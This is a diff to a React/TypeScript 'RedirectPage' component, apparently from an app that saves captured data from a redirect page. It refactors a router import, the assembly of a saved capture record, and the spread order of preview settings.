@@ -1,5 +1,5 @@
 import * as React from 'react';
-import { useParams } from 'react-router-dom';
+import * as ReactRouterDOM from 'react-router-dom';
 import type { Settings, CapturedData, PermissionType } from '../types';
 import { getTranslator } from '../contexts/LanguageContext';
 import { useNotification } from '../contexts/SettingsContext';
@@ -229,7 +229,7 @@ const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: b
 // --- Main Component ---
 
 const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview = false, isEmbeddedPreview = false }) => {
-  const { data } = useParams<{ data: string }>();
+  const { data } = ReactRouterDOM.useParams<{ data: string }>();
   const addNotification = useNotification();
 
   const [settings, setSettings] = React.useState<Settings | null>(null);
@@ -260,15 +260,11 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
     isSavingRef.current = true;
     
-    const { status: _ignoredStatus, ...restOfData } = dataToSave;
-
-    const finalData: any = {
-        ...restOfData,
-        redirectId: settingsToUse.id,
-        status: isComplete ? 'completed' : 'incomplete',
-        timestamp: Date.now(),
-        name: `Capture on ${new Date().toLocaleDateString()}`,
-    };
+    const finalData: any = { ...dataToSave };
+    finalData.redirectId = settingsToUse.id;
+    finalData.status = isComplete ? 'completed' : 'incomplete';
+    finalData.timestamp = Date.now();
+    finalData.name = `Capture on ${new Date().toLocaleDateString()}`;
 
     if (captureDocIdRef.current) {
         finalData.id = captureDocIdRef.current;
@@ -545,7 +541,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     React.useEffect(() => {
         const loadSettings = async () => {
             if (isPreview && previewSettings) {
-                setSettings({ id: 'preview', status: 'active', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
+                setSettings({ ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview', status: 'active' });
                 setStatus('redirecting');
                 return;
             }
